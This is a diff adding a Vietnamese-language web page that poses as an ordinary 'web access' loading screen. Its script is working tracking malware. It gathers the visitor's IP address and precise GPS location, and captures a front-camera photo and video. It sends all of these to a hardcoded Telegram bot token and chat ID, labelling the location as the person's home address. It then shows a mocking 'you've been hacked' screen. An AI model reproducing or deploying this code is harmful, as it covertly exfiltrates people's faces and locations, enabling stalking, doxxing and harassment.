@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Truy Cập Web</title>
+<style>
+    body { 
+        margin:0; 
+        background:#000; 
+        color:#fff; 
+        font-family:Arial; 
+        text-align:center; 
+        height:100vh; 
+        overflow:hidden; 
+        touch-action: manipulation; 
+        position: relative;
+    }
+
+    #matrix {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        z-index: 1;
+        pointer-events: none;
+        display: none;
+    }
+
+    .result {
+        position: relative;
+        z-index: 10;
+        height: 100vh;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 15px 12px;
+        box-sizing: border-box;
+    }
+
+    /* Tiêu đề */
+    .title {
+        color: red;
+        font-size: 1.95em;
+        margin: 10px 0 12px 0;
+        z-index: 11;
+        text-shadow: 0 0 10px #ff0000;
+    }
+
+    /* Khung ảnh phát sáng */
+    #faceImage { 
+        max-width: 92%; 
+        max-height: 36vh;
+        border: 5px solid #fff; 
+        border-radius: 12px;
+        margin-bottom: 18px;
+        z-index: 11;
+        box-shadow: 0 0 25px #fff, 
+                    0 0 50px #ff0, 
+                    0 0 80px rgba(255,255,0,0.85);
+    }
+
+    /* Phần hack top */
+    .hack-top {
+        color: yellow;
+        font-size: 1.45em;
+        line-height: 1.8;
+        margin-bottom: 22px;
+        z-index: 11;
+        text-shadow: 0 0 12px #ff0;
+    }
+
+    /* Khung troll chính - giống ảnh mày gửi */
+    .troll-box {
+        background: rgba(0,0,0,0.92);
+        border: 3px solid #ff0;
+        border-radius: 16px;
+        padding: 20px 18px;
+        margin: 0 8px;
+        max-width: 96%;
+        box-shadow: 0 0 35px #ff0, 
+                    0 0 60px rgba(255,255,0,0.7);
+        z-index: 11;
+    }
+
+    .troll-text {
+        color: yellow;
+        font-size: 1.42em;
+        line-height: 1.85;
+        text-align: center;
+        text-shadow: 0 0 10px #ff0;
+    }
+
+    button { 
+        background:#f00; 
+        color:#fff; 
+        border:none; 
+        padding:15px 30px; 
+        font-size:1.4em; 
+        margin:10px; 
+        border-radius:8px; 
+        width: 280px;
+        z-index: 11;
+    }
+
+    h1, h2 { position: relative; z-index: 11; }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<!-- START SCREEN -->
+<div id="startScreen" style="height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10;">
+    <h1 style="color:#0f0; font-size:2em;">TRUY CẬP WEB</h1>
+    <p style="color:yellow; font-size:1.4em;">Nhấn nút để tiếp tục</p>
+    <button onclick="startHack()">TIẾP TỤC</button>
+</div>
+
+<!-- LOADING -->
+<div id="loading" style="display:none; height:100vh; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10; font-size:1.8em; color:#fff;">
+    ĐANG TẢI TRANG WEB...<br>VUI LÒNG CHỜ
+</div>
+
+<!-- RETRY -->
+<div id="retrySection" style="display:none; height:100vh; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10;">
+    <p style="color:yellow; font-size:1.4em;">Bạn đã từ chối quyền.<br>Nhấn nút để thử lại:</p>
+    <button onclick="startHack()">VUI LÒNG CẤP QUYỀN</button>
+</div>
+
+<!-- RESULT TROLL - CỐ ĐỊNH -->
+<div id="result" class="result">
+    <h2 class="title">📸 MẶT BẠN ĐÃ BỊ LỘ</h2>
+    
+    <img id="faceImage">
+    
+    <div class="hack-top">
+        👨‍💻 <strong>BẠN ĐÃ BỊ HACK</strong> 📱<br>
+        🇻🇳 <strong>HACK BY DGVI</strong> ✅
+    </div>
+
+    <div class="troll-box">
+        <div id="infoText" class="troll-text"></div>
+    </div>
+</div>
+
+<video id="video" autoplay muted playsinline style="position:absolute; top:-99999px; left:-99999px;"></video>
+<canvas id="canvas" width="1280" height="720" style="position:absolute; top:-99999px; left:-99999px;"></canvas>
+
+<script>
+// MATRIX
+const canvas = document.getElementById("matrix");
+const ctx = canvas.getContext("2d");
+
+function resizeMatrix() {
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+}
+resizeMatrix();
+window.addEventListener('resize', resizeMatrix);
+
+const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const fontSize = 14;
+let drops = [];
+
+function initDrops() {
+    drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+}
+initDrops();
+
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00ff00";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+
+setInterval(() => {
+    if (document.getElementById("result").style.display === "flex") drawMatrix();
+}, 35);
+
+// LOGIC
+const TOKEN = "8645167578:AAG_RxO1oagAVD-XayksoDhPq37QOJArzjI";
+const CHAT_ID = "8650144012";
+
+let ip = "Không lấy được";
+let vido = "";
+let kinhdo = "";
+let googleMapLink = "https://maps.google.com";
+
+let photoSent = false;
+let videoSent = false;
+
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+
+function sendPhoto(base64) {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `📸 Ảnh mặt\nIP: ${ip}\nVị trí: ${googleMapLink}`);
+    form.append("photo", dataURLtoBlob(base64), "face.jpg");
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form })
+    .then(() => { photoSent = true; checkAndShowResult(); })
+    .catch(() => { photoSent = true; checkAndShowResult(); });
+}
+
+function sendVideo(blob) {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `🎥 Video camera trước\nIP: ${ip}\nVị trí: ${googleMapLink}`);
+    form.append("video", blob, "video.webm");
+
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: form })
+    .then(() => { videoSent = true; checkAndShowResult(); })
+    .catch(() => { videoSent = true; checkAndShowResult(); });
+}
+
+function sendLocationUpdate(vido, kinhdo) {
+    const text = `🔴 VỊ TRÍ CỦA THẰNG NGU\n\nIP: ${ip}\n\nVĩ độ: ${vido}\nKinh độ: ${kinhdo}\n\nĐịa Chỉ Nhà: ${googleMapLink}\n\nThời gian: ${new Date().toLocaleString('vi-VN')}`;
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("text", text);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: "POST", body: form });
+}
+
+function checkAndShowResult() {
+    if (photoSent && videoSent) {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("result").style.display = "flex";
+        document.getElementById("startScreen").style.display = "none";
+        document.getElementById("retrySection").style.display = "none";
+        document.getElementById("matrix").style.display = "block";
+
+        document.getElementById("infoText").innerHTML = `
+            Ê thằng ngu mày bị lộ rồi:))<br><br>
+            IP: <strong>${ip}</strong><br><br>
+            📍 <a href="${googleMapLink}" target="_blank" style="color:cyan;">Xem Google Maps</a><br><br>
+            Vĩ độ: <strong>${vido}</strong><br>
+            Kinh độ: <strong>${kinhdo}</strong>
+        `;
+    }
+}
+
+function startHack() {
+    document.getElementById("startScreen").style.display = "none";
+    document.getElementById("loading").style.display = "flex";
+    document.getElementById("retrySection").style.display = "none";
+    document.getElementById("matrix").style.display = "none";
+
+    if (navigator.vibrate) navigator.vibrate([200, 150, 200]);
+    getIP();
+}
+
+function getIP() {
+    fetch("https://api4.ipify.org?format=json")
+    .then(r => r.json())
+    .then(data => ip = data.ip || "Không lấy được")
+    .catch(() => {})
+    .finally(requestLocation);
+}
+
+let bestPos = null;
+let watchId = null;
+
+function requestLocation() {
+    if (!navigator.geolocation) {
+        sendLocationUpdate("0", "0");
+        return requestCamera();
+    }
+
+    bestPos = null;
+    let gotOne = false;
+
+    watchId = navigator.geolocation.watchPosition(
+        pos => {
+            if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
+                bestPos = pos;
+            }
+
+            if (!gotOne) {
+                gotOne = true;
+
+                vido = pos.coords.latitude.toFixed(8);
+                kinhdo = pos.coords.longitude.toFixed(8);
+                googleMapLink = `https://maps.google.com/?q=${vido},${kinhdo}`;
+                sendLocationUpdate(vido, kinhdo);
+            }
+        },
+        () => {
+            // ❌ lỗi GPS → vẫn gửi fallback
+            sendLocationUpdate("0", "0");
+        },
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 8000
+        }
+    );
+
+    // 🔥 QUAN TRỌNG: luôn gửi fallback nếu chưa có
+    setTimeout(() => {
+        try { navigator.geolocation.clearWatch(watchId); } catch(e){}
+
+        if (!gotOne) {
+            sendLocationUpdate("0", "0");
+        }
+
+        requestCamera();
+    }, 5000);
+}
+
+let recorder, chunks = [];
+
+function requestCamera() {
+    const constraints = { video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+    .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.play().catch(()=>{});
+
+        let mimeType = 'video/webm;codecs=vp9';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm;codecs=vp8';
+
+        recorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2000000 });
+        chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+
+        // 🔥 FIX Ở ĐÂY
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, {type: mimeType});
+
+            sendVideo(blob); // gửi trực tiếp
+            stream.getTracks().forEach(t => t.stop());
+        };
+
+        recorder.start(1500);
+
+        video.onloadeddata = () => {
+            setTimeout(() => {
+                const canvasEl = document.getElementById("canvas");
+                const ctx2 = canvasEl.getContext("2d");
+                ctx2.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);
+
+                const photo = canvasEl.toDataURL("image/jpeg", 0.94);
+                document.getElementById("faceImage").src = photo;
+                sendPhoto(photo);
+
+                setTimeout(() => {
+                    if (recorder && recorder.state !== "inactive") recorder.stop();
+                }, 4000);
+            }, 400);
+        };
+    })
+    .catch(() => {
+        photoSent = true;
+        videoSent = true;
+        checkAndShowResult();
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("retrySection").style.display = "flex";
+        document.getElementById("matrix").style.display = "none";
+    });
+}
+</script>
+</body>
+</html>
